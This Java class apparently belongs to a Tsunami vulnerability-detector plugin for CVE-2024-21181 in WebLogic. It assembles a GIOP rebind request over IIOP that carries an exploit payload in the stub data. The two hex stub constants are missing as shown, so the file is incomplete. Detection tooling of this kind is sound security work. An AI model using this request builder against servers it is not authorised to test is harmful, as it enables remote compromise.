package com.google.tsunami.plugins.detectors.cves.cve202421181.weblogic.requests;

import com.google.tsunami.plugins.detectors.cves.cve202421181.Utils;
import com.google.tsunami.plugins.detectors.cves.cve202421181.giop.Giop12Request;
import com.google.tsunami.plugins.detectors.cves.cve202421181.giop.GiopPacket;
import com.google.tsunami.plugins.detectors.cves.cve202421181.giop.GiopRequest;
import java.nio.ByteBuffer;

public class RebindRequestFactory extends WeblogicIiopRequestFactory {
  private static final byte[] STUB_PART1 =
      Utils.hexStringToByteArray(

  private static final byte[] STUB_PART2 =
      Utils.hexStringToByteArray(


  private static byte[] generateStubData(String referenceName, byte[] exploitPayload) {
    int stubDataLength =
        4 // Hardcoded int 1
            + 4 // Refernce name length (int)
            + referenceName.length()
            + Utils.calcBytesToAlign(referenceName.length())
            + STUB_PART1.length
            + 4 // (exploit payload length + 4) (int)
            + 4 // exploit payload length (again)
            + exploitPayload.length
            + Utils.calcBytesToAlign(exploitPayload.length)
            + STUB_PART2.length;

    ByteBuffer buf = ByteBuffer.allocate(stubDataLength);
    buf.putInt((byte) 1);
    buf.putInt(referenceName.length());
    buf.put(referenceName.getBytes());
    buf.put(new byte[Utils.calcBytesToAlign(buf.position())]);
    buf.put(STUB_PART1);
    buf.putInt(exploitPayload.length + 4);
    buf.putInt(exploitPayload.length);
    buf.put(exploitPayload);
    buf.put(new byte[Utils.calcBytesToAlign(buf.position())]);
    buf.put(STUB_PART2);
    return buf.array();
  }

  public static GiopPacket generate(
      int requestId, byte[] keyAddress, String referenceName, byte[] exploitPayload) {
    return WeblogicIiopRequestFactory.builder()
        .setPayload(
            Giop12Request.builder()
                .setRequestId(requestId)
                .setKeyAddress(keyAddress)
                .setOperation(GiopRequest.Operation.OP_REBIND_ANY)
                .setServiceContextList(generateServiceContexts())
                .setStubData(generateStubData(referenceName, exploitPayload))
                .build())
        .build();
  }
}
